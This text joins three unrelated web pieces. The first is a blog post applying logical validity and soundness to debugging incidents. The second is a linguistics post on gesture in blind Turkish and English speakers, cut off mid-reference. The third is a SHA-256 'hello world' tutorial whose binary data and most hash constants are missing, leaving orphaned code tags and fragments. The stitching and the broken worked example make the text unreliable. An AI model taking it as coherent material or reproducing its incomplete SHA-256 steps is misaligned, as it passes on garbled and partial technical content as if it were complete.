<p>Now comes the fun part, where we apply logical arguments to programming. </p>
<h2>Arguments in programming</h2>
<p>Read the following argument, keeping in mind the definitions of validity and soundness. See if you can tell if the argument is valid or invalid, sound or unsound. (If you don’t want a spoiler, don’t scroll past the argument until you’ve read the full argument.)</p>
<blockquote><p>
The site is unusually slow today.<br>
We performed a large deployment this morning.<br>
The deployment is the cause of the slowness.
</p></blockquote>
<p>This argument is <b>unsound</b>. Even if the premises are true, we can’t know based on the premises that the deployment was the cause of the slowness. How do we know it’s not a coincidence? For all we know, our site got featured on Hacker News and a big traffic spike is the cause of the slowness. Our argument is unsound because its conclusion isn’t necessarily true based on its premises. So, the reason that the argument is unsound is because even though its premises are true, its logic is invalid.</p>
<p>Here’s another example. Instead of just two premises, this argument has three.</p>
<blockquote><p>
Sometimes slowness is caused by code changes.<br>
Sometimes slowness is caused by traffic spikes.<br>
The site is unusually slow today.<br>
The cause of the slowness is either a code change or a traffic spike.
</p></blockquote>
<p>This argument is also unsound. There are more possible reasons for a site to be slow than just a code change or a traffic spike. For example, maybe our DevOps person killed half the servers in the middle of the night last night without our knowing it. So despite true premises, this argument, like the preceding one, is <b>invalid</b>.</p>
<p>Here’s another example.</p>
<blockquote><p>
The code in the most recent deployment introduced a bug.<br>
The only thing that went out in the most recent deployment was Josh’s code.<br>
Josh’s code caused the bug.
</p></blockquote>
<p>As long as this argument’s premises are true, this argument is <b>sound</b>. If we know for sure that the most recent deployment introduced a bug, and we know for sure that the only thing that went out in the most recent deployment was Josh’s code, then it does logically follow that Josh’s code caused the bug.</p>
<p>Here’s a final example. This one is a little more detailed than the previous ones.</p>
<blockquote><p>
At 10:32am, a duplicate $20 charge appeared in the system for patient #5225.<br>
Also at 10:32am, Jason carelessly performed a manual actual action on patient #5225, an action that was related to that patient’s $20 charge.<br>
Jason caused the duplicate charge.
</p></blockquote>
<p>This is another <b>unsound</b> argument. Even though it sounds likely that my action caused the duplicate charge, it’s not logically valid to make that inference based on the premises. The invalidity is perhaps not obvious, but can be made more apparent by asking the question: “Are there any possible circumstances under which Jason’s manual action would NOT have created the duplicate charge?” For example, it’s possible that the card could have accidentally been run twice, and the timing was a coincidence.</p>
<p>I have empirical proof of the invalidity of the above argument because this is a real-life example and, in fact, my action was not the cause of the duplicate charge. Part of what helped me determine this is the following sound argument.</p>
<blockquote><p>
It’s impossible to create a charge without having a patient’s credit card information.<br>
It would have been physically impossible for me to involve the patient’s credit card information when I performed my manual action because we don’t store credit card information in the system.<br>
My action couldn’t have created the duplicate charge.
</p></blockquote>
<p>The preceding sound argument (and remember, sound arguments always have true conclusions) led me to investigate more deeply. What I ultimately discovered was that the patient’s card did in fact get run twice and the timing was just a coincidence. Why wasn’t it obvious from the outset that the patient’s card was run twice? Because we use Authorize.net as a payment gateway, and apparently sometimes the Authorize.net API returns a failure response even when the charge was successfully incurred, so from the perspective of our application there was only one charge that got successfully created, even though in reality there were two.</p>
<h2>Good luck with your arguments</h2>
<p>Next time you’re confronted with a programming mystery, I invite you to frame your mystery in terms of arguments. Write down your premises, and make sure to write down only premises that are true, otherwise your argument will be unsound. Then try to come up with a conclusion and make sure that your conclusion necessarily follows from your premises so that your argument is valid. If your argument is valid and sound, your conclusion will necessarily be true.</p>

I always like pointing out this fact when I teach classes on gesture, because it gives us an an interesting perspective on how we learn and use gestures. Until now I’ve mostly cited <a href="https://t.umblr.com/redirect?z=http%3A%2F%2Fwww.nature.com%2Fnature%2Fjournal%2Fv396%2Fn6708%2Fabs%2F396228a0.html&amp;t=ZjI3ODlkYTk0MjZhMTQ3OTdkZTY3OWE3MjA1YzU0NTI2N2JmYTk3MixqY2RYbFZ2Qw%3D%3D&amp;b=t%3A0DQa0-vgmaHanljYXgHk5w&amp;p=https%3A%2F%2Fwww.superlinguo.com%2Fpost%2F149950073272%2Fblind-people-gesture-and-why-thats-kind-of-a-big&amp;m=0" target="_blank">a 1998 paper from Jana Iverson and Susan Goldin-Meadow</a> that analysed the gestures and speech of young blind people. Not only do blind people gesture, but the frequency and types of gestures they use does not appear to differ greatly from how sighted people gesture. If people learn gesture without ever <i>seeing</i> a gesture (and, most likely, never being shown), then there must be something about learning a language that means you get gestures as a bonus.</p><p>Blind people will even gesture when talking to other blind people, and sighted people will gesture when speaking on the phone - so we know that people don’t <i>only </i>gesture when they speak to someone who can see their gestures. <br></p><p>Earlier this year a new paper came out that adds to this story. Şeyda Özçalışkan, Ché Lucero and Susan Goldin-Meadow looked at the gestures of blind speakers of Turkish and English, to see if the *way* they gestured was different to sighted speakers of those languages. Some of the sighted speakers were blindfolded and others left able to see their conversation partner. <br></p><p>Turkish and English were chosen, because it has already been established that speakers of those languages <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fscholar.google.co.uk%2Fscholar%3Fhl%3Den%26q%3DExpressing%2Bmanner%2Band%2Bpath%2Bin%2BEnglish%2Band%2BTurkish%253A%2BDifferences%2Bin%2Bspeech%252C%2Bgesture%252C%2Band%2Bconceptualization.%26btnG%3D%26as_sdt%3D1%252C5%26as_sdtp%3D&amp;t=N2I4ZTYyZmU0ZTFlOWY3NjMwYzliYjNiNjQ3MTQyZWJmNGJjZThhMCxqY2RYbFZ2Qw%3D%3D&amp;b=t%3A0DQa0-vgmaHanljYXgHk5w&amp;p=https%3A%2F%2Fwww.superlinguo.com%2Fpost%2F149950073272%2Fblind-people-gesture-and-why-thats-kind-of-a-big&amp;m=0" target="_blank">consistently gesture differently</a> when talking about videos of items moving. English speakers will be more likely to show the manner (e.g. ‘rolling’ or bouncing’) and trajectory (e.g. ‘left to right’, ‘downwards’) together in one gesture, and Turkish speakers will show these features as two separate gestures. This reflects the fact that English ‘roll down’ is one verbal clause, while in Turkish the equivalent would be<i> yuvarlanarak iniyor</i>, which translates as two verbs ‘rolling descending’. <br></p><p>Since we know that blind people <i>do</i> gesture, Özçalışkan’s team wanted to figure out if they gestured like other speakers of their language. Did the blind Turkish speakers separate the manner and trajectory of their gestures like their verbs? Did English speakers combine them? Of course, the standard methodology of showing videos wouldn’t work with blind participants, so the researchers built three dimensional models of events for people to feel before they discussed them.<br></p><p>The results showed that blind Turkish speakers gesture like their sighted counterparts, and the same for English speakers. All Turkish speakers gestured significantly differently from all English speakers, regardless of sightedness. This means that these particular gestural patterns are something that’s deeply linked to the grammatical properties of a language, and not something that we learn from looking at other speakers. <br></p><p><b>References</b><br></p><p>Jana M.

<p>SHA-2 (Secure Hash Algorithm 2), of which SHA-256 is a part, is one of the most popular <a href="https://qvault.io/2020/01/01/very-basic-intro-to-hash-functions-sha-256-md-5-etc/">hashing algorithms</a> out there. In this article, we are going to break down each step of the algorithm as simple as we can and work through a real-life example by hand.</p>



<p>SHA-2 is known for its security (it hasn’t <a aria-label="undefined (opens in a new tab)" href="https://shattered.io/" target="_blank" rel="noreferrer noopener">broken down like SHA-1</a>), and its speed. In cases where <a href="https://qvault.io/2019/12/30/very-basic-intro-to-key-derivation-functions-argon2-scrypt-etc/">keys are not being generated</a>, such as mining Bitcoin, a fast hash algorithm like SHA-2 often reigns supreme.</p>



<h2><span id="What_Is_a_Hash_Function">What Is a Hash Function?</span>
</h2>



<p>If you want to read more about hash functions in general, do so <a href="https://qvault.io/2020/01/01/very-basic-intro-to-hash-functions-sha-256-md-5-etc/">here</a>. That said, in order to move forward let’s recap three of the main purposes of a hash function:</p>



<ul>
<li>To scramble data deterministically</li>
<li>To accept input of any length and output a fixed-length result</li>
<li>To irreversibly manipulate data. The input can’t be derived from the output</li>
</ul>
<h2><span id="SHA-2_vs_SHA-256">SHA-2 vs SHA-256</span>
</h2>



<p>SHA-2 is an <em>algorithm</em>, a generalized idea of how to hash data. SHA-256 sets additional constants that define the SHA-2 algorithm’s behavior. One such constant is the output size. “256” and “512” refer to their respective output digest sizes in bits.</p>



<p>Let’s step through an example of SHA-256.</p>



<h2><span id="SHA-256_hello_world_Step_1_-_Pre-Processing">SHA-256 “hello world”; Step 1 – Pre-Processing</span>
</h2>



<ul><li>Convert “hello world” to binary:</li></ul>

<ul><li>Append a single 1:</li></ul>

01110010 01101100 01100100 1</code></pre>



<ul><li>Pad with 0’s until data is a multiple of 512, less 64 bits (448 bits in our case):</li></ul>

<ul><li>Append 64 bits to the end, where the 64 bits are a <a href="https://en.wikipedia.org/wiki/Endianness">big-endian</a> integer representing the length of the original input in binary. In our case, 88, or in binary, “1011000”.</li></ul>

<p>Now we have our input, which will always be evenly divisible by 512.</p>



<h2><span id="Step_2_-_Initialize_Hash_Values_h">Step 2 – Initialize Hash Values (h)</span>
</h2>



<p>Now we create 8 hash values. These are hard-coded constants that represent the first 32 bits of the fractional parts of the square roots of the first 8 primes: 2, 3, 5, 7, 11, 13, 17, 19</p>

h7 := 0x5be0cd19</code></pre>



<h2><span id="Step_3_-_Initialize_Round_Constants_k">Step 3 – Initialize Round Constants (k)</span>

<p>Similar to step 2, we are creating some constants (<em>Learn more about constants and when to use them <a href="https://qvault.io/2019/10/14/constants-in-go-vs-javascript-and-when-to-use-them/" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener">here</a></em>). This time, there are 64 of them. Each value (0-63)  is the first 32 bits of the fractional parts of the cube roots of the first 64 primes (2 – 311).</p>

<p>The following steps will happen for each 512-bit “chunk” of data from our input. In our case, because <em>“hello world”</em> is so short, we only have one chunk. At each iteration of the loop, we will be mutating the hash values h0-h7, which will be the final output.</p>
